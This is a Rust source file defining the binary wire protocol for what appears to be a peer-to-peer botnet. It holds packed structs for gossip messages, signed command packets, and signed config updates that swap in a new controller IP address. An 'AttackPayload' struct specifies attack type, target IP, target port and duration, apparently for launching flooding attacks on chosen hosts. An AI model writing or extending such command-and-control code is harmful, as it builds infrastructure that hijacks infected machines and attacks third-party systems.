// This file is the "Single Source of Truth" for the Wire Protocol.
// It is used to generate C headers via cbindgen.

#[repr(C)]
pub struct WireConstants;

impl WireConstants {
    pub const P2P_MAGIC: u32 = 0x9A1D3F7C;
    pub const P2P_TYPE_GOSSIP: u8 = 1;
    pub const P2P_TYPE_CMD: u8 = 2;
    pub const P2P_TYPE_COUNT_REQ: u8 = 3;
    pub const P2P_TYPE_COUNT_RESP: u8 = 4;
    pub const MQTT_PUBLISH: u8 = 0x30;
    pub const MAX_TOPIC_LEN: u16 = 256;
}

/// Header structure for P2P packets.
/// Layout: [Magic(4)] [Type(1)]
#[repr(C, packed)]
pub struct WireP2PHeader {
    pub magic: u32, // BE
    pub type_: u8,
}

/// Command Packet Structure (Header + Body).
/// Layout: [Magic(4)] [Type(1)] [Nonce(4)] [Signature(64)] [Len(2)]
#[repr(C, packed)]
pub struct WireP2PCommand {
    pub magic: u32,       // BE
    pub type_: u8,        // 2
    pub nonce: u32,       // BE
    pub signature: [u8; 64],
    pub payload_len: u16, // BE
}

/// Gossip Header
/// Layout: [Magic(4)] [Type(1)] [Count(1)]
#[repr(C, packed)]
pub struct WireP2PGossip {
    pub magic: u32,
    pub type_: u8,
    pub count: u8,
}

#[repr(C, packed)]
pub struct WireSignedConfigUpdate {
    pub magic: u32,       // 0x52224AC4
    pub timestamp: u64,   // UTC Timestamp
    pub version: u32,     // Sequence
    pub new_ip_len: u8,
    pub new_ip: [u8; 64],
    pub signature: [u8; 64],
}

/// Attack Payload (Body of a Command)
/// Layout: [Type(1)] [TargetIP(4)] [TargetPort(2)] [Duration(4)]
#[repr(C, packed)]
pub struct AttackPayload {
    pub attack_type: u8,
    pub target_ip: u32,   // BE
    pub target_port: u16, // BE
    pub duration: u32,    // BE
}

impl WireConstants {
    pub const CONFIG_MAGIC: u32 = 0x52224AC4;
}
